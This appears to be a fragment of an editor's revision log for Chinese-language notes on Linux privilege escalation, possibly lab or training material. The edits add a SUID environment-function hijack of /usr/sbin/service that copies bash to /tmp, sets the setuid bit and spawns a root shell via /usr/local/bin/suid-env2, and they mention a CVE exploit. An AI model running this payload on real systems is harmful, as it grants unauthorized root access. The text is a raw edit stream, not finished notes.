64,1164]]],[1598025557656,["whale@Whale",[[1,1139,"/usr/sbin/service"]],[1139,1139],[1156,1156]]],[1598025558774,["whale@Whale",[[1,1157,"\n"]],[1156,1156],[1157,1157]]],[1598026748543,["whale@Whale",[[1,1508,"\n"]],[1507,1507],[1508,1508]]],[1598026761722,["whale@Whale",[[1,1508,"明确两个东西，一个是"]],[1508,1508],[1518,1518]]],[1598026771869,["whale@Whale",[[1,1518,"环境变量，一个是函数"]],[1518,1518],[1528,1528]]],[1598027219395,["whale@Whale",[[1,1624,"\n"]],[1623,1623],[1624,1624]]],[1598027225271,["whale@Whale",[[1,1624,"/usr/sbin/service"]],[1624,1624],[1641,1641]]],[1598027225729,["whale@Whale",[[1,1642,"\n"]],[1641,1641],[1642,1642]]],[1598027225983,["whale@Whale",[[1,1643,"\n"]],[1642,1642],[1643,1643]]],[1598027228166,["whale@Whale",[[1,1624,"\""]],[1624,1624],[1625,1625]]],[1598027234368,["whale@Whale",[[1,1642,"\" h"]],[1642,1642],[1645,1645]]],[1598027235315,["whale@Whale",[[-1,1644,"h"]],[1645,1645],[1644,1644]]],[1598027239136,["whale@Whale",[[1,1644,"函数名称"]],[1644,1644],[1648,1648]]],[1598027289927,["whale@Whale",[[1,1649,"b"]],[1649,1650],[1649,1650]]],[1598027290089,["whale@Whale",[[1,1650,"a"]],[1649,1650],[1649,1651]]],[1598027290366,["whale@Whale",[[1,1651,"'s"]],[1649,1651],[1649,1653]]],[1598027290504,["whale@Whale",[[1,1653,"h"]],[1649,1653],[1649,1654]]],[1598027290716,["whale@Whale",[[-1,1651,"'"]],[1649,1654],[1649,1653]]],[1598027292412,["whale@Whale",[[1,1653," d"]],[1653,1653],[1655,1655]]],[1598027292896,["whale@Whale",[[-1,1654,"d"]],[1655,1655],[1654,1654]]],[1598027296186,["whale@Whale",[[1,1654,"定义一个i"]],[1654,1654],[1659,1659]]],[1598027296444,["whale@Whale",[[-1,1658,"i"]],[1659,1659],[1658,1658]]],[1598027305957,["whale@Whale",[[1,1658,"很像service绝对路径的函数"]],[1658,1658],[1674,1674]]],[1598027821634,["whale@Whale",[[1,1729,"\n"]],[1728,1728],[1729,1729]]],[1598027821799,["whale@Whale",[[1,1730,"\n"]],[1729,1729],[1730,1730]]],[1598027830429,["whale@Whale",[[1,1730,"suid程序本来是想去执行serr"]],[1730,1730],[1747,1747]]],[1598027830924,["whale@Whale",[[-1,1746,"r"]],[1747,1747],[1746,1746]]],[1598027835617,["whale@Whale",[[1,1746,"vice apache2 start，"]],[1746,1746],[1765,1765]]],[1598027855914,["whale@Whale",[[1,1765,"/usr/sbin/service"]],[1765,1765],[1782,1782]]],[1598027856213,["whale@Whale",[[1,1783,"\n"]],[1782,1782],[1783,1783]]],[1598027864270,["whale@Whale",[[1,1783,"cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;"]],[1783,1783],[1839,1839]]],[1598027864998,["whale@Whale",[[1,1840,"\n"]],[1839,1839],[1840,1840]]],[1598028455349,["whale@Whale",[[1,2589,"\n\n"]],[2589,2589],[2590,2590]]],[1598028456996,["whale@Whale",[[-1,2590,"\n"],[1,2591,"- [https://bash.cyberciti.biz/guide/Pass_arguments_into_a_function](https://bash.cyberciti.biz/guide/Pass_arguments_into_a_function)"]],[2590,2590],[2722,2722]]],[1598059209475,["whale@Whale",[[1,886,"\n"]],[885,885],[886,886]]],[1598059211695,["whale@Whale",[[1,886,"··"]],[886,886],[888,888]]],[1598059212726,["whale@Whale",[[-1,886,"··"]],[888,888],[886,886]]],[1598059214072,["whale@Whale",[[1,886,"```"]],[886,886],[889,889]]],[1598059216268,["whale@Whale",[[1,996,"\n"]],[995,995],[996,996]]],[1598059217226,["whale@Whale",[[1,996,"```"]],[996,996],[999,999]]],[1598059219509,["whale@Whale",[[1,1008,"\n"]],[1008,1008],[1009,1009]]],[1598059220430,["whale@Whale",[[1,1053,"`"]],[1053,1053],[1054,1054]]],[1598059221368,["whale@Whale",[[-1,1053,"`"]],[1054,1054],[1053,1053]]],[1598059222929,["whale@Whale",[[1,1008,"```"]],[1008,1008],[1011,1011]]],[1598059227948,["whale@Whale",[[1,1169,"```"]],[1169,1169],[1172,1172]]],[1598059269217,["whale@Whale",[[1,842,"\n"]],[841,841],[842,842]]],[1598059270825,["whale@Whale",[[1,842,"```"]],[842,842],[845,845]]],[1598059272389,["whale@Whale",[[1,882,"```"]],[882,882],[885,885]]],[1598068460986,["whale@Whale",[[1,1176,"\n"]],[1176,1176],[1177,1177]]],[1598068461287,["whale@Whale",[[1,1177,"\n"]],[1177,1177],[1178,1178]]],[1598068463166,["whale@Whale",[[1,1177,"echo $PATH\necho $USER\necho $PWD\necho $HOME\n什么是环境变量：\n可以使用export命令去定义环境变量\n比如说：\n环境变量与terminal终端息息相关，当打开了一个terminal，它就会自动加载环境\n变量。\n如何去使用环境变量：\nexport b=192.168.28.128\nping -c 4 $b\n"]],[1177,1177],[1351,1351]]],[1598077324094,["whale@Whale",[[-1,16,"引子\n一个具有独立思考能力的人是可贵的。\n"]],[16,37],[16,16]]],[1598077329991,["whale@Whale",[[1,16,"制作的视频娇嗔"]],[16,16],[23,23]]],[1598077331033,["whale@Whale",[[-1,21,"娇嗔"]],[23,23],[21,21]]],[1598077333362,["whale@Whale",[[1,21,"教程"]],[21,21],[23,23]]],[1598077333635,["whale@Whale",[[1,24,"\n"]],[23,23],[24,24]]],[1598077346416,["whale@Whale",[[1,24,"https://www.bilibili.com/video/BV1ok4y1m75p"]],[24,24],[67,67]]],[1598077347218,["whale@Whale",[[1,68,"\n"]],[67,67],[68,68]]],[1598078431028,["whale@Whale",[[1,808,"\n"]],[807,807],[808,808]]],[1598078437959,["whale@Whale",[[1,72,"方法一："]],[72,72],[76,76]]],[1598078443214,["whale@Whale",[[1,8,"提权"]],[8,8],[10,10]]],[1598078445398,["whale@Whale",[[-1,4,"文件权限提权"]],[10,10],[4,4]]],[1598078455950,["whale@Whale",[[1,4,"提权的三种思路"]],[4,4],[11,11]]],[1598078463686,["whale@Whale",[[1,819,"方法二："]],[819,819],[823,823]]],[1598078472158,["whale@Whale",[[1,1053,"方法三："]],[1053,1053],[1057,1057]]],[1598078484183,["whale@Whale",[[1,1224,"\n"]],[1223,1223],[1224,1224]]],[1598078484999,["whale@Whale",[[1,1224,"---"]],[1224,1224],[1227,1227]]],[1598078500440,["whale@Whale",[[-1,1411,"方法一"]],[1411,1414],[1411,1411]]],[1598078505252,["whale@Whale",[[1,1411,"1"]],[1411,1411],[1412,1412]]],[1598078510593,["whale@Whale",[[-1,1411,"1："]],[1412,1412],[1411,1411]]],[1598078512304,["whale@Whale",[[1,1411,"提权"]],[1411,1411],[1413,1413]]],[1598078514006,["whale@Whale",[[-1,1411,"提权"]],[1413,1413],[1411,1411]]],[1598078515842,["whale@Whale",[[1,1411,"案例一："]],[1411,1411],[1415,1415]]],[1598078518252,["whale@Whale",[[-1,1752,"方法二："]],[1756,1756],[1752,1752]]],[1598078520634,["whale@Whale",[[1,1752,"案例er"]],[1752,1752],[1756,1756]]],[1598078521456,["whale@Whale",[[-1,1754,"er"]],[1756,1756],[1754,1754]]],[1598078521755,["whale@Whale",[[1,1754,"e"]],[1754,1754],[1755,1755]]],[1598078522111,["whale@Whale",[[-1,1754,"e"]],[1755,1755],[1754,1754]]],[1598078523237,["whale@Whale",[[1,1754,"二："]],[1754,1754],[1756,1756]]],[1598078561261,["whale@Whale",[[1,1979,"//"]],[1979,1979],[1981,1981]]],[1598078564968,["whale@Whale",[[1,1873,"//"]],[1873,1873],[1875,1875]]],[1598078574056,["whale@Whale",[[1,1900,"//   "]],[1900,1900],[1905,1905]]],[1598078579523,["whale@Whale",[[1,1875,"    "]],[1875,1875],[1879,1879]]],[1598078580635,["whale@Whale",[[-1,1878," "]],[1879,1879],[1878,1878]]],[1598078585467,["whale@Whale",[[1,1991,"   "]],[1991,1991],[1994,1994]]],[1598078606849,["whale@Whale",[[1,1988,"//  将这个函数“”"]],[1988,1988],[1999,1999]]],[1598078614803,["whale@Whale",[[1,1998,"/usr/sbin/service"]],[1998,1998],[2015,2015]]],[1598078623872,["whale@Whale",[[1,2016,"保存到环境变量，并且"]],[2016,2016],[2026,2026]]],[1598078624036,["whale@Whale",[[-1,2025,"且"]],[2026,2026],[2025,2025]]],[1598078633885,["whale@Whale",[[1,2025,"去执行suid程序“”"]],[2025,2025],[2036,2036]]],[1598078635049,["whale@Whale",[[1,2035,"/usr/local/bin/suid-env2"]],[2035,2035],[2059,2059]]],[1598078658519,["whale@Whale",[[1,940,"\n"]],[939,939],[940,940]]],[1598078661386,["whale@Whale",[[1,940,"使用cve"]],[940,940],[945,945]]],[1598078663378,["whale@Whale",[[-1,942,"cve"]],[945,945],[942,942]]],[1598078664010,["whale@Whale",[[1,942,"ep"]],[942,942],[944,944]]],[1598078664620,["whale@Whale",[[-1,943,"p"]],[944,944],[943,943]]],[1598078674531,["whale@Whale",[[1,943,"xp去执行获得root权限"]],[943,943],[956,956]]],[1598078681569,["whale@Whale",[[1,956,"，具体请看视频教程"]],[956,956],[965,965]]]]]]}